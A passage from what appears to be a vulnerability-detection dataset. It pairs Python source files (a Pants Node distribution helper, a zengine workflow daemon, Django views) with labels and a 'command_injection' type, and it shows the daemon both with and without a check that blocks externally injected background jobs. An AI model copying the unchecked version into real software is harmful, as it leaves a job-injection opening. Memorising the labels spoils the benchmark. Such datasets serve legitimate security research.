CONTRIBUTORS.md).\n# Licensed under the Apache License, Version 2.0 (see LICENSE).\n\nfrom __future__ import (absolute_import, division, generators, nested_scopes, print_function,\n                        unicode_literals, with_statement)\n\nimport logging\nimport os\nimport subprocess\nfrom collections import namedtuple\n\nfrom pants.base.exceptions import TaskError\nfrom pants.binaries.binary_util import BinaryUtil\nfrom pants.fs.archive import TGZ\nfrom pants.subsystem.subsystem import Subsystem\nfrom pants.util.contextutil import temporary_dir\nfrom pants.util.memo import memoized_property\n\n\nlogger = logging.getLogger(__name__)\n\n\nclass NodeDistribution(object):\n  \"\"\"Represents a self-bootstrapping Node distribution.\"\"\"\n\n  class Factory(Subsystem):\n    options_scope = 'node-distribution'\n\n    @classmethod\n    def subsystem_dependencies(cls):\n      return (BinaryUtil.Factory,)\n\n    @classmethod\n    def register_options(cls, register):\n      super(NodeDistribution.Factory, cls).register_options(register)\n      register('--supportdir', advanced=True, default='bin/node',\n               help='Find the Node distributions under this dir.  Used as part of the path to '\n                    'lookup the distribution with --binary-util-baseurls and --pants-bootstrapdir')\n      register('--version', advanced=True, default='6.9.1',\n               help='Node distribution version.  Used as part of the path to lookup the '\n                    'distribution with --binary-util-baseurls and --pants-bootstrapdir')\n      register('--package-manager', advanced=True, default='npm', fingerprint=True,\n               choices=NodeDistribution.VALID_PACKAGE_MANAGER_LIST.keys(),\n               help='Default package manager config for repo. Should be one of {}'.format(\n                 NodeDistribution.VALID_PACKAGE_MANAGER_LIST.keys()))\n      register('--yarnpkg-version', advanced=True, default='v0.19.1', fingerprint=True,\n               help='Yarnpkg version. Used for binary utils')\n\n    def create(self):\n      # NB: create is an instance method to allow the user to choose global or scoped.\n      # It's not unreasonable to imagine multiple Node versions in play; for example: when\n      # transitioning from the 0.10.x series to the 0.12.x series.\n      binary_util = BinaryUtil.Factory.create()\n      options = self.get_options()\n      return NodeDistribution(\n        binary_util, options.supportdir, options.version,\n        package_manager=options.package_manager,\n        yarnpkg_version=options.yarnpkg_version)\n\n  PACKAGE_MANAGER_NPM = 'npm'\n  PACKAGE_MANAGER_YARNPKG = 'yarnpkg'\n  VALID_PACKAGE_MANAGER_LIST = {\n    'npm': PACKAGE_MANAGER_NPM,\n    'yarn': PACKAGE_MANAGER_YARNPKG\n  }\n\n  @classmethod\n  def validate_package_manager(cls, package_manager):\n    if package_manager not in cls.VALID_PACKAGE_MANAGER_LIST.keys():\n      raise TaskError('Unknown package manager: %s' % package_manager)\n    package_manager = cls.VALID_PACKAGE_MANAGER_LIST[package_manager]\n    return package_manager\n\n  @classmethod\n  def _normalize_version(cls, version):\n    # The versions reported by node and embedded in distribution package names are 'vX.Y.Z' and not\n    # 'X.Y.Z'.\n    return version if version.startswith('v') else 'v' + version\n\n  def __init__(self, binary_util, relpath, version, package_manager, yarnpkg_version):\n    self._binary_util = binary_util\n    self._relpath = relpath\n    self._version = self._normalize_version(version)\n    self.package_manager = self.validate_package_manager(package_manager=package_manager)\n    self.yarnpkg_version = self._normalize_version(version=yarnpkg_version)\n    logger.debug('Node.js version: %s package manager from config: %s',\n                 self._version, package_manager)\n\n  @property\n  def version(self):\n    \"\"\"Returns the version of the Node distribution.\n\n    :returns: The Node distribution version number string.\n    :rtype: string\n    \"\"\"\n    return self._version\n\n  def get_binary_path_from_tgz(self, supportdir, version, filename, inpackage_path):\n    tarball_filepath = self._binary_util.select_binary(\n      supportdir=supportdir, version=version, name=filename)\n    logger.debug('Tarball for %s(%s): %s', supportdir, version, tarball_filepath)\n    work_dir = os.path.dirname(tarball_filepath)\n    unpacked_dir = os.path.join(work_dir, 'unpacked')\n    if not os.path.exists(unpacked_dir):\n      with temporary_dir(root_dir=work_dir) as tmp_dist:\n        TGZ.extract(tarball_filepath, tmp_dist)\n        os.rename(tmp_dist, unpacked_dir)\n    binary_path = os.path.join(unpacked_dir, inpackage_path)\n    return binary_path\n\n  @memoized_property\n  def path(self):\n    \"\"\"Returns the root path of this node distribution.\n\n    :returns: The Node distribution root path.\n    :rtype: string\n    \"\"\"\n    node_path = self.get_binary_path_from_tgz(\n      supportdir=self._relpath, version=self.version, filename='node.tar.gz',\n      inpackage_path='node')\n    logger.debug('Node path: %s', node_path)\n    return node_path\n\n  @memoized_property\n  def yarnpkg_path(self):\n    \"\"\"Returns the root path of yarnpkg distribution.\n\n    :returns: The yarnpkg root path.\n    :rtype: string\n    \"\"\"\n    yarnpkg_path = self.get_binary_path_from_tgz(\n      supportdir='bin/yarnpkg', version=self.yarnpkg_version, filename='yarnpkg.tar.gz',\n      inpackage_path='dist')\n    logger.debug('Yarnpkg path: %s', yarnpkg_path)\n    return yarnpkg_path\n\n  class Command(namedtuple('Command', ['bin_dir_path', 'executable', 'args'])):\n    \"\"\"Describes a command to be run using a Node distribution.\"\"\"\n\n    @property\n    def cmd(self):\n      \"\"\"The command line that will be executed when this command is spawned.\n\n      :returns: The full command line used to spawn this command as a list of strings.\n      :rtype: list\n      \"\"\"\n      return [os.path.join(self.bin_dir_path, self.executable)] + self.args\n\n    def _prepare_env(self, kwargs):\n      \"\"\"Returns a modifed copy of kwargs['env'], and a copy of kwargs with 'env' removed.\n\n      If there is no 'env' field in the kwargs, os.environ.copy() is used.\n      env['PATH'] is set/modified to contain the Node distribution's bin directory at the front.\n\n      :param kwargs: The original kwargs.\n      :returns: An (env, kwargs) tuple containing the modified env and kwargs copies.\n      :rtype: (dict, dict)\n      \"\"\"\n      kwargs = kwargs.copy()\n      env = kwargs.pop('env', os.environ).copy()\n      env['PATH'] = (self.bin_dir_path + os.path.pathsep + env['PATH']\n                     if env.get('PATH', '') else self.bin_dir_path)\n      return env, kwargs\n\n    def run(self, **kwargs):\n      \"\"\"Runs this command.\n\n      :param **kwargs: Any extra keyword arguments to pass along to `subprocess.Popen`.\n      :returns: A handle to the running command.\n      :rtype: :class:`subprocess.Popen`\n      \"\"\"\n      env, kwargs = self._prepare_env(kwargs)\n      return subprocess.Popen(self.cmd, env=env, **kwargs)\n\n    def check_output(self, **kwargs):\n      \"\"\"Runs this command returning its captured stdout.\n\n      :param **kwargs: Any extra keyword arguments to pass along to `subprocess.Popen`.\n      :returns: The captured standard output stream of the command.\n      :rtype: string\n      :raises: :class:`subprocess.CalledProcessError` if the command fails.\n      \"\"\"\n      env, kwargs = self._prepare_env(kwargs)\n      return subprocess.check_output(self.cmd, env=env, **kwargs)\n\n    def __str__(self):\n      return ' '.join(self.cmd)\n\n  def node_command(self, args=None):\n    \"\"\"Creates a command that can run `node`, passing the given args to it.\n\n    :param list args: An optional list of arguments to pass to `node`.\n    :returns: A `node` command that can be run later.\n    :rtype: :class:`NodeDistribution.Command`\n    \"\"\"\n    # NB: We explicitly allow no args for the `node` command unlike the `npm` command since running\n    # `node` with no arguments is useful, it launches a REPL.\n    return self._create_command('node', args)\n\n  def npm_command(self, args):\n    \"\"\"Creates a command that can run `npm`, passing the given args to it.\n\n    :param list args: A list of arguments to pass to `npm`.\n    :returns: An `npm` command that can be run later.\n    :rtype: :class:`NodeDistribution.Command`\n    \"\"\"\n    return self._create_command('npm', args)\n\n  def yarnpkg_command(self, args):\n    \"\"\"Creates a command that can run `yarnpkg`, passing the given args to it.\n\n    :param list args: A list of arguments to pass to `yarnpkg`.\n    :returns: An `yarnpkg` command that can be run later.\n    :rtype: :class:`NodeDistribution.Command`\n    \"\"\"\n    return self.Command(\n      bin_dir_path=os.path.join(self.yarnpkg_path, 'bin'), executable='yarnpkg', args=args or [])\n\n  def _create_command(self, executable, args=None):\n    return self.Command(os.path.join(self.path, 'bin'), executable, args or [])\n/n/n/n", "label": 1, "vtype": "command_injection"}, {"id": "52eafbee90f8ddf78be0c7452828d49423246851", "code": "zengine/wf_daemon.py/n/n#!/usr/bin/env python\n\"\"\"\nworkflow worker daemon\n\"\"\"\nimport json\nimport traceback\nfrom pprint import pformat\n\nimport signal\nfrom time import sleep, time\n\nimport pika\nfrom tornado.escape import json_decode\n\nfrom pyoko.conf import settings\nfrom pyoko.lib.utils import get_object_from_path\nfrom zengine.client_queue import ClientQueue, BLOCKING_MQ_PARAMS\nfrom zengine.engine import ZEngine\nfrom zengine.current import Current\nfrom zengine.lib.cache import Session, KeepAlive\nfrom zengine.lib.exceptions import HTTPError, SecurityInfringementAttempt\nfrom zengine.log import log\nimport sys\n# receivers should be imported at right time, right place\n# they will not registered if not placed in a central location\n# but they can cause \"cannot import settings\" errors if imported too early\nfrom zengine.receivers import *\n\nsys._zops_wf_state_log = ''\n\nwf_engine = ZEngine()\n\nLOGIN_REQUIRED_MESSAGE = {'error': \"Login required\", \"code\": 401}\n\n\nclass Worker(object):\n    \"\"\"\n    Workflow runner worker object\n    \"\"\"\n    INPUT_QUEUE_NAME = 'in_queue'\n    INPUT_EXCHANGE = 'input_exc'\n\n    def __init__(self):\n        self.connect()\n        signal.signal(signal.SIGTERM, self.exit)\n        log.info(\"Worker starting\")\n\n    def exit(self, signal=None, frame=None):\n        \"\"\"\n        Properly close the AMQP connections\n        \"\"\"\n        self.input_channel.close()\n        self.client_queue.close()\n        self.connection.close()\n        log.info(\"Worker exiting\")\n        sys.exit(0)\n\n    def connect(self):\n        \"\"\"\n        make amqp connection and create channels and queue binding\n        \"\"\"\n        self.connection = pika.BlockingConnection(BLOCKING_MQ_PARAMS)\n        self.client_queue = ClientQueue()\n        self.input_channel = self.connection.channel()\n\n        self.input_channel.exchange_declare(exchange=self.INPUT_EXCHANGE,\n                                            type='topic',\n                                            durable=True)\n        self.input_channel.queue_declare(queue=self.INPUT_QUEUE_NAME)\n        self.input_channel.queue_bind(exchange=self.INPUT_EXCHANGE, queue=self.INPUT_QUEUE_NAME)\n        log.info(\"Bind to queue named '%s' queue with exchange '%s'\" % (self.INPUT_QUEUE_NAME,\n                                                                        self.INPUT_EXCHANGE))\n\n    def run(self):\n        \"\"\"\n        actual consuming of incoming works starts here\n        \"\"\"\n        self.input_channel.basic_consume(self.handle_message,\n                                         queue=self.INPUT_QUEUE_NAME,\n                                         no_ack=True)\n        try:\n            self.input_channel.start_consuming()\n        except (KeyboardInterrupt, SystemExit):\n            log.info(\" Exiting\")\n            self.exit()\n\n    def _prepare_error_msg(self, msg):\n        try:\n            return \\\n                msg + '\\n\\n' + \\\n                \"INPUT DATA: %s\\n\\n\" % pformat(self.current.input) + \\\n                \"OUTPUT DATA: %s\\n\\n\" % pformat(self.current.output) + \\\n                sys._zops_wf_state_log\n        except:\n            return msg\n\n    def _handle_ping_pong(self, data, session):\n\n        still_alive = KeepAlive(sess_id=session.sess_id).update_or_expire_session()\n        msg = {'msg': 'pong'}\n        if not still_alive:\n            msg.update(LOGIN_REQUIRED_MESSAGE)\n        return msg\n\n    def _handle_job(self, session, data, headers):\n        # security check for preventing external job execution attempts\n        if headers['source'] != 'Internal':\n            raise SecurityInfringementAttempt(\n                \"Someone ({user}) from {ip} tried to inject a job {job}\".format(user=session['user_id'], ip=headers['remote_ip'], job=data['job']))\n        self.current = Current(session=session, input=data)\n        self.current.headers = headers\n        # import method\n        method = get_object_from_path(settings.BG_JOBS[data['job']])\n        # call view with current object\n        method(self.current)\n\n    def _handle_view(self, session, data, headers):\n        # create Current object\n        self.current = Current(session=session, input=data)\n        self.current.headers = headers\n\n        # handle ping/pong/session expiration\n        if data['view'] == 'ping':\n            return self._handle_ping_pong(data, session)\n\n        # handle authentication\n        if not (self.current.is_auth or data['view'] in settings.ANONYMOUS_WORKFLOWS):\n            return LOGIN_REQUIRED_MESSAGE\n\n        # import view\n        view = get_object_from_path(settings.VIEW_URLS[data['view']])\n\n        # call view with current object\n        view(self.current)\n\n        # return output\n        return self.current.output\n\n    def _handle_workflow(self, session, data, headers):\n        wf_engine.start_engine(session=session, input=data, workflow_name=data['wf'])\n        wf_engine.current.headers = headers\n        self.current = wf_engine.current\n        wf_engine.run()\n        # if self.connection.is_closed:\n        #     log.info(\"Connection is closed, re-opening...\")\n        #     self.connect()\n        return wf_engine.current.output\n\n    def handle_message(self, ch, method, properties, body):\n        \"\"\"\n        this is a pika.basic_consumer callback\n        handles client inputs, runs appropriate workflows and views\n\n        Args:\n            ch: amqp channel\n            method: amqp method\n            properties:\n            body: message body\n        \"\"\"\n        input = {}\n        headers = {}\n        try:\n            self.sessid = method.routing_key\n\n            input = json_decode(body)\n            data = input['data']\n\n            # since this comes as \"path\" we dont know if it's view or workflow yet\n            # TODO: just a workaround till we modify ui to\n            if 'path' in data:\n                if data['path'] in settings.VIEW_URLS:\n                    data['view'] = data['path']\n                else:\n                    data['wf'] = data['path']\n            session = Session(self.sessid)\n\n            headers = {'remote_ip': input['_zops_remote_ip'],\n                       'source': input['_zops_source']}\n\n            if 'wf' in data:\n                output = self._handle_workflow(session, data, headers)\n            elif 'job' in data:\n\n                self._handle_job(session, data, headers)\n                return\n            else:\n                output = self._handle_view(session, data, headers)\n\n        except HTTPError as e:\n            import sys\n            if hasattr(sys, '_called_from_test'):\n                raise\n            output = {'cmd': 'error', 'error': self._prepare_error_msg(e.message), \"code\": e.code}\n            log.exception(\"Http error occurred\")\n        except:\n            self.current = Current(session=session, input=data)\n            self.current.headers = headers\n            import sys\n            if hasattr(sys, '_called_from_test'):\n                raise\n            err = traceback.format_exc()\n            output = {'error': self._prepare_error_msg(err), \"code\": 500}\n            log.exception(\"Worker error occurred with messsage body:\\n%s\" % body)\n        if 'callbackID' in input:\n            output['callbackID'] = input['callbackID']\n        log.info(\"OUTPUT for %s: %s\" % (self.sessid, output))\n        output['reply_timestamp'] = time()\n        self.send_output(output)\n\n    def send_output(self, output):\n        # TODO: This is ugly, we should separate login process\n        # log.debug(\"SEND_OUTPUT: %s\" % output)\n        if self.current.user_id is None or 'login_process' in output:\n            self.client_queue.send_to_default_exchange(self.sessid, output)\n        else:\n            self.client_queue.send_to_prv_exchange(self.current.user_id, output)\n\n\ndef run_workers(no_subprocess, watch_paths=None, is_background=False):\n    \"\"\"\n    subprocess handler\n    \"\"\"\n    import atexit, os, subprocess, signal\n    if watch_paths:\n        from watchdog.observers import Observer\n        # from watchdog.observers.fsevents import FSEventsObserver as Observer\n        # from watchdog.observers.polling import PollingObserver as Observer\n        from watchdog.events import FileSystemEventHandler\n\n    def on_modified(event):\n        if not is_background:\n            print(\"Restarting worker due to change in %s\" % event.src_path)\n        log.info(\"modified %s\" % event.src_path)\n        try:\n            kill_children()\n            run_children()\n        except:\n            log.exception(\"Error while restarting worker\")\n\n    handler = FileSystemEventHandler()\n    handler.on_modified = on_modified\n\n    # global child_pids\n    child_pids = []\n    log.info(\"starting %s workers\" % no_subprocess)\n\n    def run_children():\n        global child_pids\n        child_pids = []\n        for i in range(int(no_subprocess)):\n            proc = subprocess.Popen([sys.executable, __file__],\n                                    stdout=subprocess.PIPE,\n                                    stderr=subprocess.PIPE)\n            child_pids.append(proc.pid)\n            log.info(\"Started worker with pid %s\" % proc.pid)\n\n    def kill_children():\n        \"\"\"\n        kill subprocess on exit of manager (this) process\n        \"\"\"\n        log.info(\"Stopping worker(s)\")\n        for pid in child_pids:\n            if pid is not None:\n                os.kill(pid, signal.SIGTERM)\n\n    run_children()\n    atexit.register(kill_children)\n    signal.signal(signal.SIGTERM, kill_children)\n    if watch_paths:\n        observer = Observer()\n        for path in watch_paths:\n            if not is_background:\n                print(\"Watching for changes under %s\" % path)\n            observer.schedule(handler, path=path, recursive=True)\n        observer.start()\n    while 1:\n        try:\n            sleep(1)\n        except KeyboardInterrupt:\n            log.info(\"Keyboard interrupt, exiting\")\n            if watch_paths:\n                observer.stop()\n                observer.join()\n            sys.exit(0)\n\n\nif __name__ == '__main__':\n    if 'manage' in str(sys.argv):\n        no_subprocess = [arg.split('manage=')[-1] for arg in sys.argv if 'manage' in arg][0]\n        run_workers(no_subprocess)\n    else:\n        worker = Worker()\n        worker.run()\n/n/n/n", "label": 0, "vtype": "command_injection"}, {"id": "52eafbee90f8ddf78be0c7452828d49423246851", "code": "/zengine/wf_daemon.py/n/n#!/usr/bin/env python\n\"\"\"\nworkflow worker daemon\n\"\"\"\nimport json\nimport traceback\nfrom pprint import pformat\n\nimport signal\nfrom time import sleep, time\n\nimport pika\nfrom tornado.escape import json_decode\n\nfrom pyoko.conf import settings\nfrom pyoko.lib.utils import get_object_from_path\nfrom zengine.client_queue import ClientQueue, BLOCKING_MQ_PARAMS\nfrom zengine.engine import ZEngine\nfrom zengine.current import Current\nfrom zengine.lib.cache import Session, KeepAlive\nfrom zengine.lib.exceptions import HTTPError\nfrom zengine.log import log\nimport sys\n# receivers should be imported at right time, right place\n# they will not registered if not placed in a central location\n# but they can cause \"cannot import settings\" errors if imported too early\nfrom zengine.receivers import *\n\nsys._zops_wf_state_log = ''\n\nwf_engine = ZEngine()\n\nLOGIN_REQUIRED_MESSAGE = {'error': \"Login required\", \"code\": 401}\nclass Worker(object):\n    \"\"\"\n    Workflow runner worker object\n    \"\"\"\n    INPUT_QUEUE_NAME = 'in_queue'\n    INPUT_EXCHANGE = 'input_exc'\n\n    def __init__(self):\n        self.connect()\n        signal.signal(signal.SIGTERM, self.exit)\n        log.info(\"Worker starting\")\n\n    def exit(self, signal=None, frame=None):\n        \"\"\"\n        Properly close the AMQP connections\n        \"\"\"\n        self.input_channel.close()\n        self.client_queue.close()\n        self.connection.close()\n        log.info(\"Worker exiting\")\n        sys.exit(0)\n\n    def connect(self):\n        \"\"\"\n        make amqp connection and create channels and queue binding\n        \"\"\"\n        self.connection = pika.BlockingConnection(BLOCKING_MQ_PARAMS)\n        self.client_queue = ClientQueue()\n        self.input_channel = self.connection.channel()\n\n        self.input_channel.exchange_declare(exchange=self.INPUT_EXCHANGE,\n                                            type='topic',\n                                            durable=True)\n        self.input_channel.queue_declare(queue=self.INPUT_QUEUE_NAME)\n        self.input_channel.queue_bind(exchange=self.INPUT_EXCHANGE, queue=self.INPUT_QUEUE_NAME)\n        log.info(\"Bind to queue named '%s' queue with exchange '%s'\" % (self.INPUT_QUEUE_NAME,\n                                                                        self.INPUT_EXCHANGE))\n\n    def run(self):\n        \"\"\"\n        actual consuming of incoming works starts here\n        \"\"\"\n        self.input_channel.basic_consume(self.handle_message,\n                                         queue=self.INPUT_QUEUE_NAME,\n                                         no_ack=True)\n        try:\n            self.input_channel.start_consuming()\n        except (KeyboardInterrupt, SystemExit):\n            log.info(\" Exiting\")\n            self.exit()\n\n    def _prepare_error_msg(self, msg):\n        try:\n            return \\\n                msg + '\\n\\n' + \\\n                \"INPUT DATA: %s\\n\\n\" % pformat(self.current.input) + \\\n                \"OUTPUT DATA: %s\\n\\n\" % pformat(self.current.output) + \\\n                sys._zops_wf_state_log\n        except:\n            return msg\n\n    def _handle_ping_pong(self, data, session):\n\n        still_alive = KeepAlive(sess_id=session.sess_id).update_or_expire_session()\n        msg = {'msg': 'pong'}\n        if not still_alive:\n            msg.update(LOGIN_REQUIRED_MESSAGE)\n        return msg\n\n    def _handle_job(self, session, data, headers):\n        self.current = Current(session=session, input=data)\n        self.current.headers = headers\n        # import method\n        method = get_object_from_path(settings.BG_JOBS[data['job']])\n        # call view with current object\n        method(self.current)\n\n\n    def _handle_view(self, session, data, headers):\n        # create Current object\n        self.current = Current(session=session, input=data)\n        self.current.headers = headers\n\n        # handle ping/pong/session expiration\n        if data['view'] == 'ping':\n            return self._handle_ping_pong(data, session)\n\n        # handle authentication\n        if not (self.current.is_auth or data['view'] in settings.ANONYMOUS_WORKFLOWS):\n            return LOGIN_REQUIRED_MESSAGE\n\n        # import view\n        view = get_object_from_path(settings.VIEW_URLS[data['view']])\n\n        # call view with current object\n        view(self.current)\n\n        # return output\n        return self.current.output\n\n    def _handle_workflow(self, session, data, headers):\n        wf_engine.start_engine(session=session, input=data, workflow_name=data['wf'])\n        wf_engine.current.headers = headers\n        self.current = wf_engine.current\n        wf_engine.run()\n        # if self.connection.is_closed:\n        #     log.info(\"Connection is closed, re-opening...\")\n        #     self.connect()\n        return wf_engine.current.output\n\n    def handle_message(self, ch, method, properties, body):\n        \"\"\"\n        this is a pika.basic_consumer callback\n        handles client inputs, runs appropriate workflows and views\n\n        Args:\n            ch: amqp channel\n            method: amqp method\n            properties:\n            body: message body\n        \"\"\"\n        input = {}\n        try:\n            self.sessid = method.routing_key\n\n            input = json_decode(body)\n            data = input['data']\n\n            # since this comes as \"path\" we dont know if it's view or workflow yet\n            #TODO: just a workaround till we modify ui to\n            if 'path' in data:\n                if data['path'] in settings.VIEW_URLS:\n                    data['view'] = data['path']\n                else:\n                    data['wf'] = data['path']\n            session = Session(self.sessid)\n\n            headers = {'remote_ip': input['_zops_remote_ip']}\n\n            if 'wf' in data:\n                output = self._handle_workflow(session, data, headers)\n            elif 'job' in data:\n\n                self._handle_job(session, data, headers)\n                return\n            else:\n                output = self._handle_view(session, data, headers)\n\n        except HTTPError as e:\n            import sys\n            if hasattr(sys, '_called_from_test'):\n                raise\n            output = {'cmd': 'error', 'error': self._prepare_error_msg(e.message), \"code\": e.code}\n            log.exception(\"Http error occurred\")\n        except:\n            self.current = Current(session=session, input=data)\n            self.current.headers = headers\n            import sys\n            if hasattr(sys, '_called_from_test'):\n                raise\n            err = traceback.format_exc()\n            output = {'error': self._prepare_error_msg(err), \"code\": 500}\n            log.exception(\"Worker error occurred with messsage body:\\n%s\" % body)\n        if 'callbackID' in input:\n            output['callbackID'] = input['callbackID']\n        log.info(\"OUTPUT for %s: %s\" % (self.sessid, output))\n        output['reply_timestamp'] = time()\n        self.send_output(output)\n\n    def send_output(self, output):\n        # TODO: This is ugly, we should separate login process\n        # log.debug(\"SEND_OUTPUT: %s\" % output)\n        if self.current.user_id is None or 'login_process' in output:\n            self.client_queue.send_to_default_exchange(self.sessid, output)\n        else:\n            self.client_queue.send_to_prv_exchange(self.current.user_id, output)\n\n\ndef run_workers(no_subprocess, watch_paths=None, is_background=False):\n    \"\"\"\n    subprocess handler\n    \"\"\"\n    import atexit, os, subprocess, signal\n    if watch_paths:\n        from watchdog.observers import Observer\n        # from watchdog.observers.fsevents import FSEventsObserver as Observer\n        # from watchdog.observers.polling import PollingObserver as Observer\n        from watchdog.events import FileSystemEventHandler\n\n\n    def on_modified(event):\n        if not is_background:\n            print(\"Restarting worker due to change in %s\" % event.src_path)\n        log.info(\"modified %s\" % event.src_path)\n        try:\n            kill_children()\n            run_children()\n        except:\n            log.exception(\"Error while restarting worker\")\n\n    handler = FileSystemEventHandler()\n    handler.on_modified = on_modified\n\n    # global child_pids\n    child_pids = []\n    log.info(\"starting %s workers\" % no_subprocess)\n\n    def run_children():\n        global child_pids\n        child_pids = []\n        for i in range(int(no_subprocess)):\n            proc = subprocess.Popen([sys.executable, __file__],\n                                    stdout=subprocess.PIPE,\n                                    stderr=subprocess.PIPE)\n            child_pids.append(proc.pid)\n            log.info(\"Started worker with pid %s\" % proc.pid)\n\n    def kill_children():\n        \"\"\"\n        kill subprocess on exit of manager (this) process\n        \"\"\"\n        log.info(\"Stopping worker(s)\")\n        for pid in child_pids:\n            if pid is not None:\n                os.kill(pid, signal.SIGTERM)\n\n    run_children()\n    atexit.register(kill_children)\n    signal.signal(signal.SIGTERM, kill_children)\n    if watch_paths:\n        observer = Observer()\n        for path in watch_paths:\n            if not is_background:\n                print(\"Watching for changes under %s\" % path)\n            observer.schedule(handler, path=path, recursive=True)\n        observer.start()\n    while 1:\n        try:\n            sleep(1)\n        except KeyboardInterrupt:\n            log.info(\"Keyboard interrupt, exiting\")\n            if watch_paths:\n                observer.stop()\n                observer.join()\n            sys.exit(0)\n\n\nif __name__ == '__main__':\n    if 'manage' in str(sys.argv):\n        no_subprocess = [arg.split('manage=')[-1] for arg in sys.argv if 'manage' in arg][0]\n        run_workers(no_subprocess)\n    else:\n        worker = Worker()\n        worker.run()\n/n/n/n", "label": 1, "vtype": "command_injection"}, {"id": "fa57b716a2f936c6da66fdd5ba6c531303eba7e2", "code": "screendoor/views.py/n/nfrom string import digits\nfrom django.core.mail import send_mail\nfrom django.shortcuts import render, redirect\nfrom django.contrib.auth import get_user_model\nfrom django.contrib.auth import login, logout\nfrom django.contrib.auth.decorators import login_required\n\nfrom .uservisibletext import InterfaceText, CreateAccountFormText, PositionText, PositionsViewText, LoginFormText\nfrom .forms import ScreenDoorUserCreationForm, LoginForm, CreatePositionForm, ImportApplicationsForm\nfrom .models import EmailAuthenticateToken, Position\nfrom screendoor.parseposter import parse_upload\nfrom screendoor.redactor import parse_applications\n\n\n# Each view is responsible for doing one of two things: returning an HttpResponse object containing the content for\n# the requested page, or raising an exception such as Http404.\n# The @login_required decorator redirects unauthenticated sessions to 'settings.LOGIN_URL' or the specified URL\n\n\n# Index currently redirects to the positions view if logged in\n@login_required(login_url='login/', redirect_field_name=None)\ndef index(request):\n    return redirect('positions')\n    # Returns main page\n    return render(request, 'index.html',\n                  {'user': request.user, 'baseVisibleText': InterfaceText})\n\n\n# Renders account registration form\ndef register_form(request):\n    register_form = ScreenDoorUserCreationForm()\n    if request.method == 'POST':\n        # create a form instance and populate it with data from the request:\n        register_form = ScreenDoorUserCreationForm(request.POST)\n        # check whether form data is valid\n        if register_form.is_valid():\n            # Create user\n            user = create_account(request)\n            # Send confirmation e-mail\n            send_user_email(request, user)\n            # Redirects to...\n            return render(request, 'registration/register.html',\n                          {'register_form': register_form,\n                           'account_created': format(CreateAccountFormText.account_created % user)})\n    # Returns form page\n    return render(request, 'registration/register.html',\n                  {'register_form': register_form})\n\n\n# Creates and returns user object from request data\ndef create_account(request):\n    # Creates account and saves email, password, username to database\n    user = get_user_model().objects.create_user(\n        request.POST['email'].lower(), password=request.POST['password1'], email=request.POST['email'].lower())\n    # Extrapolate first and last name from e-mail account (experimental)\n    user.first_name = request.POST['email'].split('.')[0].title()\n    user.last_name = request.POST['email'].split(\n        '.')[1].split('@')[0].title().translate({ord(n): None for n in digits})\n    # Set user as inactive until e-mail confirmation\n    user.email_confirmed = False\n    # Save updated user info to database\n    user.save()\n    return user\n\n\n# Sends account confirmation e-mail to user\n# Currently sends mock e-mail via console\ndef send_user_email(request, user):\n    url = generate_confirmation_url(request, user)\n    send_mail(\n        'ScreenDoor: Please confirm e-mail address',\n        'Please visit the following URL to confirm your account: ' + url,\n        'screendoor@screendoor.ca',\n        # Address: should be user.email\n        [user.email],\n        fail_silently=False,\n    )\n\n\n# Creates and returns a working account confirmation URL\ndef generate_confirmation_url(request, user):\n    token = EmailAuthenticateToken()\n    token.user = user\n    token.create_key()\n    token.save()\n    # TODO: generate first part of URL programmatically not as hardcoded string\n    return \"http://localhost:8000/confirm?key=\" + str(token.key)\n\n\n# Clears any GET data, i.e. account confirmation token string from URL\ndef clear_get_data(request):\n    # Clears any GET data\n    request.GET._mutable = True\n    request.GET['key'] = None\n    request.GET._mutable = False\n\n\n# Returns true if user authentication token is valid and userhas been validated and saved\ndef authenticate_user(account_key):\n    # If authentication key is valid, activate user and delete authentication token\n    if EmailAuthenticateToken.objects.filter(key=account_key).exists():\n        token = EmailAuthenticateToken.objects.get(key=account_key)\n        user = token.user\n        user.email_confirmed = True\n        user.save()\n        token.delete()\n        return True\n    return False\n\n\n# Displays form for user login and calls validation methods\ndef login_form(request):\n    # If user is not logged in, display login form\n    if not request.user.is_authenticated:\n        form = LoginForm()\n        # Has the user hit login button\n        if request.method == 'POST':\n            clear_get_data(request)\n            # Instantiate form object\n            form = LoginForm(request.POST)\n            # Validates form and persists username data\n            if form.is_valid():\n                user = form.get_user()\n                # Logs in and redirects user\n                login(request, user)\n                return redirect('home')\n        if request.GET.get('key') is not None:\n            # Check if authentication key is valid\n            if (authenticate_user(request.GET.get('key'))):\n                # Display account confirmation message\n                return render(request, 'registration/login.html',\n                              {'login_form': form,\n                               'account_confirmed': format(LoginFormText.account_confirmed % user.email)})\n            # Display validation error message\n            return render(request, 'registration/login.html',\n                          {'login_form': form, 'validation_error': LoginFormText.validation_error})\n        # Display login page\n        return render(request, 'registration/login.html',\n                      {'login_form': form})\n    # If the user is already logged in, redirect to home\n    return redirect('home')\n\n\n# Logs out user\n@login_required(login_url='/login/', redirect_field_name=None)\ndef logout_view(request):\n    logout(request)\n    return redirect('login')\n\n\n# Run parse upload script and return dictionary\ndef parse_position_return_dictionary(create_position_form):\n    # don't commit partial positions with only pdf/url into db\n    return parse_upload(create_position_form.save(commit=False))\n\n\n# Adds position to user data\ndef save_position_to_user(request):\n    request.user.positions.add(Position.objects.get(\n        id=request.session['position_id']))\n\n\n# Displays form allowing users to upload job posting PDF files and URLs\n@login_required(login_url='/login/', redirect_field_name=None)\ndef import_position(request):\n    if request.method == 'POST':\n        create_position_form = CreatePositionForm(\n            request.POST, request.FILES)\n        # Is the form data valid\n        if create_position_form.is_valid():\n            dictionary = parse_position_return_dictionary(create_position_form)\n            errors = dictionary.get('errors')\n            if errors:\n                create_position_form.add_error('pdf', errors)\n            # Is the parsed data valid (any errors added)\n            if create_position_form.is_valid():\n                position = dictionary.get('position')\n                # Persist position ID in session for saving and editing\n                request.session['position_id'] = position.id\n                # Successful render of a position\n                return render(request, 'createposition/importposition.html',\n                              {'position': position, 'form': create_position_form,\n                               'baseVisibleText': InterfaceText,\n                               'userVisibleText': PositionText})\n            # Display errors\n            return render(request, 'createposition/importposition.html',\n                          {'form': create_position_form,\n                           'baseVisibleText': InterfaceText,\n                           'userVisibleText': PositionText})\n        # User pressed save button on uploaded and parsed position\n        if request.POST.get(\"save-position\"):\n            save_position_to_user(request)\n            return redirect('home')\n    # Default view for GET request\n    create_position_form = CreatePositionForm()\n    return render(request, 'createposition/importposition.html', {\n        'form': CreatePositionForm, 'baseVisibleText': InterfaceText\n    })\n\n\n# Gets user's persisted positions sort method, or returns default\ndef get_positions_sort_method(request):\n    try:\n        return request.session['position_sort']\n    except KeyError:\n        return '-created'\n\n\n# Changes positions sort method\ndef 